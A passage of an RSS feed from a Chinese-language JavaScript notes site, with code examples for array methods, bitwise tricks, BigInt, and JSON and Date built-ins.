<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_12-includes-element-beginindex"> 12. includes(element, beginIndex)</h2>
<ul>
<li>
<p>判断数组中是否存在指定元素，解决了 indexOf() 方法，当数组中存在 NaN 的情况。</p>
</li>
<li>
<p>第二个参数指定开始查找索引。</p>
</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>includes</span><span>(</span><span>2</span><span>)</span> <span>// => true</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>includes</span><span>(</span><span>2</span><span>,</span> <span>2</span><span>)</span> <span>// => false</span>

<span>[</span><span>NaN</span><span>]</span><span>.</span><span>includes</span><span>(</span><span>NaN</span><span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_13-find-callback-this"> 13. find(callback, this)</h2>
<ul>
<li>返回第一个满足条件的项，都不满足返回 undefined。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>find</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> item <span>>=</span> <span>3</span><span>)</span> <span>// => 3</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>find</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> item <span>===</span> <span>7</span><span>)</span> <span>// => undefined</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_14-findindex-callback-this"> 14. findIndex(callback, this)</h2>
<ul>
<li>
<p>返回第一个满足条件项的索引，都不满足返回-1。</p>
</li>
<li>
<p>与 indexOf 的区别是传递一个回调函数。</p>
</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>findIndex</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> item <span>>=</span> <span>3</span><span>)</span> <span>// => 2</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>findIndex</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> item <span>===</span> <span>7</span><span>)</span> <span>// => -1</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_15-foreach-callback-this"> 15. forEach(callback, this)</h2>
<ul>
<li>遍历数组，返回 undefined。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>item <span>*</span> <span>2</span><span>)</span><span>)</span> <span>// => undefined</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_16-map-callback-this"> 16. map(callback, this)</h2>
<ul>
<li>遍历数组，返回结果项组成的新数组。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>map</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> item <span>*</span> <span>2</span><span>)</span> <span>//  => [2, 4, 6, 8, 10]</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_17-every-callback-this"> 17. every(callback, this)</h2>
<ul>
<li>
<p>检测数组中是否每一项都满足条件。</p>
</li>
<li>
<p>空数组会返回 true（使用时先判断下是否为空数组哟！）</p>
</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>every</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> item <span>></span> <span>3</span><span>)</span> <span>// => false</span>
<span>[</span><span>]</span><span>.</span><span>every</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> item <span>></span> <span>3</span><span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_18-some-callback-this"> 18. some(callback, this)</h2>
<ul>
<li>
<p>检测数组中是否有一项满足条件。</p>
</li>
<li>
<p>空数组会返回 false。</p>
</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>some</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> item <span>></span> <span>3</span><span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_19-filter-callback-this"> 19. filter(callback, this)</h2>
<ul>
<li>根据指定条件过滤出新数组。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>filter</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> item <span>></span> <span>2</span><span>)</span> <span>// => [3, 4, 5]</span>

<span>// 过滤假值</span>
<span>[</span><span>false</span><span>,</span> <span>null</span><span>,</span> <span>undefined</span><span>,</span> <span>NaN</span><span>,</span> <span>0</span><span>,</span> <span>0n</span><span>,</span> <span>''</span><span>,</span> document<span>.</span>all<span>,</span> <span>7</span><span>]</span><span>.</span><span>filter</span><span>(</span>Boolean<span>)</span> <span>// => [7]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_20-reduce-callback-initvalue"> 20. reduce(callback, initValue)</h2>
<ul>
<li>
<p>神奇的 reduce，第二个参数为初始值，不传时会拿第零个元素作为初始值。</p>
</li>
<li>
<p>在空数组上调用，且未提供初始值，会报错（使用时最好写上初始值哟！）。</p>
</li>
<li>
<p><a href="https://juejin.cn/post/6916087983808626701" target="_blank" rel="noopener noreferrer">以前我没得选，现在我只想用 Array.prototype.reduce - 尼克陈</a></p>
</li>
</ul>
<div><pre><code><span>// total：上一个回调函数的返回值；current：当前项的值；currentIndex：当前项的索引；</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>reduce</span><span>(</span><span>(</span><span>total<span>,</span> current<span>,</span> currentIndex</span><span>)</span> <span>=></span> total <span>+</span> current<span>)</span> <span>// => 15</span>
<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>reduce</span><span>(</span><span>(</span><span>total<span>,</span> current<span>,</span> currentIndex</span><span>)</span> <span>=></span> total <span>+</span> current<span>,</span> <span>7</span><span>)</span> <span>// => 22</span>

<span>[</span><span>]</span><span>.</span><span>reduce</span><span>(</span><span>(</span><span>total<span>,</span> current<span>,</span> currentIndex</span><span>)</span> <span>=></span> total <span>+</span> current<span>)</span> <span>// Uncaught TypeError: Reduce of empty array with no initial value</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_21-reduceright-callback-initvalue"> 21. reduceRight(callback, initValue)</h2>
<ul>
<li>
<p>与 reduce 类似，不过从最后一项开始累加，不传初始值时会拿最后一个元素作为初始值。</p>
</li>
<li>
<p>在空数组上调用，且未提供初始值，会报错（使用时最好写上初始值哟！）。</p>
</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>reduceRight</span><span>(</span><span>(</span><span>total<span>,</span> current<span>,</span> currentIndex</span><span>)</span> <span>=></span> total <span>+</span> current<span>)</span> <span>// => 15</span>

<span>[</span><span>]</span><span>.</span><span>reduceRight</span><span>(</span><span>(</span><span>total<span>,</span> current<span>,</span> currentIndex</span><span>)</span> <span>=></span> total <span>+</span> current<span>)</span> <span>// Uncaught TypeError: Reduce of empty array with no initial value</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_22-keys-values-entries"> 22. keys() &amp; values() &amp; entries()</h2>
<ul>
<li>返回由数组 index/value/[index, value] 组成的可迭代对象。</li>
</ul>
<div><pre><code><span>const</span> ary <span>=</span> <span>[</span><span>'jack'</span><span>,</span> <span>'pony'</span><span>,</span> <span>'coderljw'</span><span>]</span>

<span>for</span> <span>(</span><span>const</span> index <span>of</span> ary<span>.</span><span>keys</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>index<span>)</span> <span>// 依次打印：0 -> 1 -> 2</span>

<span>for</span> <span>(</span><span>const</span> value <span>of</span> ary<span>.</span><span>values</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>value<span>)</span> <span>// 依次打印：'jack' -> 'pony' -> 'coderljw'</span>

<span>for</span> <span>(</span><span>const</span> <span>[</span>index<span>,</span> value<span>]</span> <span>of</span> ary<span>.</span><span>entries</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>index<span>,</span> value<span>)</span> <span>// => 依次打印：0 'jack' -> 1 'pony' -> 2 'coderljw'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_23-at-index"> 23. at(index)</h2>
<ul>
<li>根据索引取值，默认索引为 0，负数反序取值（可简化通过 length 计算的索引）。</li>
</ul>
<div><pre><code><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>at</span><span>(</span><span>-</span><span>1</span><span>)</span> <span>// => 5</span>
</code></pre>
<div><span>1</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>奇技淫巧</title>
      <link>https://www.matrixtheone.ga/web/note/js/Arts/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/Arts/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">奇技淫巧</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-巧用位运算符"> 1. 巧用位运算符</h2>
<ul>
<li>
<p>位运算符转整数（截除小数部分）。</p>
<div><pre><code><span>-</span><span>77.77</span> <span>|</span> <span>0</span> <span>// => -77</span>
<span>~</span><span>~</span><span>77.77</span> <span>// => 77</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div></li>
<li>
<p>~ 搭配 indexOf 与 findIndex。</p>
<blockquote>
<p>~ 返回 2 的补码，~x 大致等同于 -(x+1)。</p>
</blockquote>
<div><pre><code><span>~</span><span>'clearlove'</span><span>.</span><span>indexOf</span><span>(</span><span>'7'</span><span>)</span> <span>// => 0</span>
<span>~</span><span>'clearlove'</span><span>.</span><span>split</span><span>(</span><span>''</span><span>)</span><span>.</span><span>findIndex</span><span>(</span><span>i</span> <span>=></span> i <span>===</span> <span>'7'</span><span>)</span> <span>// => 0</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div></li>
<li>
<p>取中值（截除小数部分）。</p>
<div><pre><code><span>7</span> <span>>></span> <span>1</span> <span>// => 3</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>位掩码</p>
<div><pre><code><span>const</span> Create <span>=</span> <span>1</span> <span>&lt;&lt;</span> <span>0</span>
<span>const</span> Update <span>=</span> <span>1</span> <span>&lt;&lt;</span> <span>1</span>
<span>const</span> Retrieve <span>=</span> <span>1</span> <span>&lt;&lt;</span> <span>2</span>
<span>const</span> Delete <span>=</span> <span>1</span> <span>&lt;&lt;</span> <span>3</span>

<span>let</span> account <span>=</span> <span>0</span>

<span>// 添加标识：|</span>
account <span>|=</span> Create <span>|</span> Update <span>|</span> Retrieve <span>|</span> Delete <span>// => 15</span>

<span>// 清理标识：&amp; ~</span>
account <span>&amp;=</span> <span>~</span>Delete <span>// => 7</span>

<span>// 判断包含标识：XY &amp; X === X</span>
<span>;</span><span>(</span>account <span>&amp;</span> Update<span>)</span> <span>===</span> Update <span>// => true</span>

<span>// 判断不包含标识：XY &amp; Y === 0</span>
<span>;</span><span>(</span>account <span>&amp;</span> Delete<span>)</span> <span>===</span> <span>0</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div></li>
</ul>
<h2 id="_2-巧用-json-stringify"> 2. 巧用 <a href="https://mp.weixin.qq.com/s/rdUd3g-8XFQUkIZzM0QO6g" target="_blank" rel="noopener noreferrer">JSON.stringify</a></h2>
<ul>
<li>
<p>JSON.stringify() 函数，当对象中值为 [undefined | function | symbol] 时，转换后的对象不包含此属性。</p>
<blockquote>
<ol>
<li>空字符串不传。</li>
<li>后端采用同一接口，新增不需要 id，编辑带上对应 id。</li>
</ol>
</blockquote>
</li>
</ul>
<div><pre><code><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span> <span>id</span><span>:</span> <span>void</span> <span>0</span> <span>}</span><span>)</span> <span>// => '{}'</span>

<span>// 示例</span>
<span>api</span><span>(</span><span>{</span>
  <span>id</span><span>:</span> isEdit <span>?</span> id <span>||</span> <span>void</span> <span>0</span><span>,</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_3-巧用逗号运算符简写箭头函数"> 3. 巧用逗号运算符简写箭头函数</h2>
<ul>
<li>最后一项为返回值（慎用）。</li>
</ul>
<div><pre><code><span>// 来打我丫，笨蛋！</span>
<span>[</span><span>1</span><span>]</span><span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> <span>(</span><span>(</span>res <span>=</span> i <span>*</span> <span>7</span><span>)</span><span>,</span> <span>(</span>res <span>=</span> <span><span>`</span><span>clearlove</span><span><span>${</span>res<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>)</span><span>[</span><span>0</span><span>]</span> <span>// => 'clearlove7'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>BigInt</title>
      <link>https://www.matrixtheone.ga/web/note/js/BigInt/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/BigInt/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">BigInt</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-bigint-int"> 1. BigInt(int)</h2>
<ul>
<li>可以使用构造函数（BigInt() ）和字面量（7n）创建 bigint 类型表示整数。
<blockquote>
<ol>
<li>不能使用 === 与 number 类型比较，使用 == 比较会隐式转换后再比较，Object.is() 比较为 false。</li>
<li>除一元加号（+）运算符外，所有运算符都可以使用，除法会自动截除小数部分（bigint 只能表示整数），不能混合 number 类型（比较运算符可以）。</li>
<li>0n 和 -0n 判断为 true，不能使用 Math 函数。</li>
</ol>
</blockquote>
</li>
</ul>
<div><pre><code><span>BigInt</span><span>(</span><span>7</span><span>)</span> <span>===</span> <span>7n</span> <span>// => true</span>

<span>// 可用进制形式表示</span>
<span>BigInt</span><span>(</span><span>0b1100001001</span><span>)</span> <span>// => 777n</span>

<span>7n</span> <span>===</span> <span>7</span> <span>// => false</span>
<span>7n</span> <span>==</span> <span>7</span> <span>// => true（等同于 Number(7n) === 7）</span>
Object<span>.</span><span>is</span><span>(</span><span>7</span><span>,</span> <span>7n</span><span>)</span> <span>// => false</span>

<span>+</span><span>7n</span> <span>// => TypeError</span>
<span>7n</span> <span>+</span> <span>1</span> <span>// => TypeError</span>
<span>7n</span> <span>/</span> <span>2n</span> <span>// => 3n</span>
<span>7n</span> <span>>></span> <span>1n</span> <span>// => 3n</span>
<span>7n</span> <span>></span> <span>1</span> <span>// => true</span>

<span>0n</span> <span>==</span> <span>false</span> <span>// => true</span>
<span>[</span><span>13n</span><span>,</span> <span>2</span><span>,</span> <span>0n</span><span>,</span> <span>-</span><span>1n</span><span>,</span> <span>1</span><span>]</span><span>.</span><span>sort</span><span>(</span><span>(</span><span>a<span>,</span> b</span><span>)</span> <span>=></span> <span>Number</span><span>(</span>a<span>)</span> <span>-</span> <span>Number</span><span>(</span>b<span>)</span><span>)</span> <span>// [-1n, 0n, 1, 2, 13n]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><h2 id="_2-bigint-asintn-bigint-asuintn"> 2. BigInt.asIntN() &amp; BigInt.asUintN()</h2>
<ul>
<li>
<p>BigInt.asIntN 静态方法将 BigInt 值转换为一个 <span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:0.9324em;vertical-align:-0.0833em;"></span><span>−</span><span><span>2</span><span><span><span><span style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span style="margin-right:0.02691em;">w</span><span>i</span><span>d</span><span>t</span><span>h</span><span>−</span><span>1</span></span></span></span></span></span></span></span></span></span></span></span> 与 <span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:0.9324em;vertical-align:-0.0833em;"></span><span><span>2</span><span><span><span><span style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span style="margin-right:0.02691em;">w</span><span>i</span><span>d</span><span>t</span><span>h</span><span>−</span><span>1</span></span></span></span></span></span></span></span></span><span style="margin-right:0.2222em;"></span><span>−</span><span style="margin-right:0.2222em;"></span></span><span><span style="height:0.6444em;"></span><span>1</span></span></span></span> 之间的有符号整数。</p>
</li>
<li>
<p>BigInt.asUintN 静态方法将 BigInt 转换为一个 0 和 <span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:0.9324em;vertical-align:-0.0833em;"></span><span><span>2</span><span><span><span><span style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span style="margin-right:0.02691em;">w</span><span>i</span><span>d</span><span>t</span><span>h</span></span></span></span></span></span></span></span></span><span style="margin-right:0.2222em;"></span><span>−</span><span style="margin-right:0.2222em;"></span></span><span><span style="height:0.6444em;"></span><span>1</span></span></span></span> 之间的无符号整数。</p>
</li>
</ul>
<div><pre><code><span>const</span> max1 <span>=</span> <span>2n</span> <span>**</span> <span>(</span><span>64n</span> <span>-</span> <span>1n</span><span>)</span> <span>-</span> <span>1n</span>
<span>// 溢出为负数</span>
BigInt<span>.</span><span>asIntN</span><span>(</span><span>64</span><span>,</span> max1 <span>+</span> <span>1n</span><span>)</span> <span>// => -9223372036854775808n</span>

<span>const</span> max2 <span>=</span> <span>2n</span> <span>**</span> <span>64n</span> <span>-</span> <span>1n</span>
<span>// 溢出为0n</span>
BigInt<span>.</span><span>asUintN</span><span>(</span><span>64</span><span>,</span> max2 <span>+</span> <span>1n</span><span>)</span> <span>// => 0n</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_3-tostring-radix"> 3. toString([radix])</h2>
<ul>
<li>
<p>默认转换为 10 进制字符串，只有数字有进制转换表示。</p>
</li>
<li>
<p>radix 是 2-36 之间的整数，表示被转换字符串的基数，超出基数范围将报错。</p>
</li>
</ul>
<div><pre><code><span>777n</span><span>.</span><span>toString</span><span>(</span><span>)</span> <span>// => '777'</span>
<span>777n</span><span>.</span><span>toString</span><span>(</span><span>2</span><span>)</span> <span>// => '1100001001'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>内置对象</title>
      <link>https://www.matrixtheone.ga/web/note/js/Built-In/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/Built-In/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">内置对象</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-json"> 1. JSON</h2>
<ul>
<li>
<p>JSON.stringify(value, [replacer], [space])</p>
<blockquote>
<ul>
<li>第二个参数过滤器可以是数组和函数。为数组时，仅在第一个参数是对象时生效，不存在于数组中的属性会被忽略。</li>
<li>第三个参数缩进字符可以是数字和字符串。为数字时代表空格数，范围在 [0, 10]；为字符串时取前 10 个字符。</li>
<li>因多空格会被浏览器默认忽略，搭配 CSS 设置才可在页面中正常显示（<a href="/note/project/Vue/Business/#_3-json-美化">JSON 美化</a>）。</li>
</ul>
</blockquote>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
  <span>wife</span><span>:</span> <span>'姜姒'</span><span>,</span>
<span>}</span>

<span>JSON</span><span>.</span><span>stringify</span><span>(</span>foo<span>,</span> <span>[</span><span>'wife'</span><span>]</span><span>,</span> <span>4</span><span>)</span> <span>// => '{    "wife": "姜姒"}'</span>

<span>JSON</span><span>.</span><span>stringify</span><span>(</span>
  foo<span>,</span>
  <span>(</span><span>key<span>,</span> value</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>key <span>===</span> <span>'wife'</span><span>)</span> <span>return</span> <span>'裴南苇'</span>
    <span>return</span> value
  <span>}</span><span>,</span>
  <span>'--'</span>
<span>)</span> <span>// => '{--"name": "徐扶墙",--"age": 17,--"wife": "裴南苇"}'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div></li>
<li>
<p>JSON.stringify() 在对象中值为 undefined、函数、Symbol 会被忽略，在数组中会转为 null；NaN 和 Infinity 皆转为 null，正则、Set、Map 等其余对象皆转为空对象。</p>
<div><pre><code><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span>
  <span>undefined</span><span>:</span> <span>undefined</span><span>,</span>
  <span>func</span><span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
  <span>Symbol</span><span>:</span> <span>Symbol</span><span>(</span><span>7</span><span>)</span><span>,</span>
  <span>NaN</span><span>:</span> <span>NaN</span><span>,</span>
  <span>Infinity</span><span>:</span> <span>Infinity</span><span>,</span>
  <span>RegExp</span><span>:</span> <span><span>/</span><span>777</span><span>/</span></span><span>,</span>
<span>}</span><span>)</span> <span>// => '{"NaN":null,"Infinity":null,"RegExp":{}}'</span>

<span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>[</span><span>undefined</span><span>,</span> <span>_</span> <span>=></span> <span>{</span><span>}</span><span>,</span> <span>Symbol</span><span>(</span><span>7</span><span>)</span><span>,</span> <span>NaN</span><span>,</span> <span>Infinity</span><span>,</span> <span><span>/</span><span>777</span><span>/</span></span><span>]</span><span>)</span> <span>// => '[null,null,null,null,null,{}]'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div></li>
<li>
<p>JSON.stringify() 循环引用会报错，不可枚举属性会忽略。</p>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span><span>}</span>
foo<span>.</span>bar <span>=</span> foo

<span>JSON</span><span>.</span><span>stringify</span><span>(</span>foo<span>)</span> <span>// => Uncaught TypeError</span>

<span>JSON</span><span>.</span><span>stringify</span><span>(</span>
  Object<span>.</span><span>create</span><span>(</span><span>null</span><span>,</span> <span>{</span>
    <span>name</span><span>:</span> <span>{</span> <span>value</span><span>:</span> <span>'徐扶墙'</span><span>,</span> <span>enumerable</span><span>:</span> <span>false</span> <span>}</span><span>,</span>
    <span>wife</span><span>:</span> <span>{</span> <span>value</span><span>:</span> <span>'姜姒'</span><span>,</span> <span>enumerable</span><span>:</span> <span>true</span> <span>}</span><span>,</span>
  <span>}</span><span>)</span>
<span>)</span> <span>// => '{"wife":"姜姒"}'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div></li>
<li>
<p>toJSON()，自定义序列化。</p>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>undefined</span><span>,</span>
  <span>daughter</span><span>:</span> <span>'柿子'</span><span>,</span>
  <span>harem</span><span>:</span> <span>[</span><span>'姜姒'</span><span>,</span> <span>undefined</span><span>,</span> <span>'裴南苇'</span><span>]</span><span>,</span>
  <span>toJSON</span><span>:</span> <span>_</span> <span>=></span> <span>'南宫仆射'</span><span>,</span>
<span>}</span>

<span>JSON</span><span>.</span><span>stringify</span><span>(</span>foo<span>)</span> <span>// => '"南宫仆射"'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div></li>
<li>
<p>JSON.parse(text, [reviver])</p>
<blockquote>
<p>第二个参数为转换器函数。</p>
</blockquote>
<div><pre><code><span>const</span> foo <span>=</span> <span>{</span>
  <span>name</span><span>:</span> <span>'徐扶墙'</span><span>,</span>
  <span>age</span><span>:</span> <span>17</span><span>,</span>
  <span>wife</span><span>:</span> <span>'姜姒'</span><span>,</span>
<span>}</span>

<span>JSON</span><span>.</span><span>parse</span><span>(</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span>foo<span>)</span><span>,</span> <span>(</span><span>key<span>,</span> value</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>key <span>===</span> <span>'wife'</span><span>)</span> <span>return</span> <span>'裴南苇'</span>
  <span>return</span> value
<span>}</span><span>)</span> <span>// => {name: '徐扶墙', age: 17, wife: '裴南苇'}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div></li>
</ul>
<h2 id="_2-date"> 2. Date</h2>
<ul>
<li>
<p>获取当前时间戳。</p>
<div><pre><code>Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>// => -28800000</span>
<span>+</span><span>new</span> <span>Date</span><span>(</span><span>)</span> <span>// => -28800000</span>
<span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>getTime</span><span>(</span><span>)</span> <span>// => // -28800000</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<p>转 ISO 时间格式（比北京时间慢 8 小时）。</p>
<div><pre><code><span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>toISOString</span><span>(</span><span>)</span> <span>// => '1969-12-31T16:00:00.000Z'</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>根据地区（浏览器主语言）格式化时间。</p>
<div><pre><code><span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>toLocaleString</span><span>(</span><span>)</span> <span>// => '1970/1/1 上午12:00:00'</span>
<span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>toLocaleTimeString</span><span>(</span><span>)</span> <span>// => '上午12:00:00'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div></li>
<li>
<p>计算季度。</p>
<div><pre><code><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>getMonth</span><span>(</span><span>)</span> <span>+</span> <span>3</span><span>)</span> <span>/</span> <span>3</span> <span>|</span> <span>0</span> <span>// => 1</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>获取间隔日期表。</p>
<div><pre><code><span>const</span> <span>getDateList</span> <span>=</span> <span>options</span> <span>=></span> <span>{</span>
  <span>const</span> <span>{</span> date <span>=</span> <span>new</span> <span>Date</span><span>(</span><span>)</span><span>,</span> days <span>=</span> <span>7</span><span>,</span> spacing <span>=</span> <span>1</span> <span>}</span> <span>=</span> options <span>||</span> <span>{</span><span>}</span>
  <span>const</span> size <span>=</span> <span>1000</span> <span>*</span> <span>60</span> <span>*</span> <span>60</span> <span>*</span> <span>24</span> <span>*</span> spacing
  <span>const</span> ary <span>=</span> <span>[</span><span>]</span>
  <span>while</span> <span>(</span>ary<span>.</span>length <span>&lt;</span> days<span>)</span> <span>{</span>
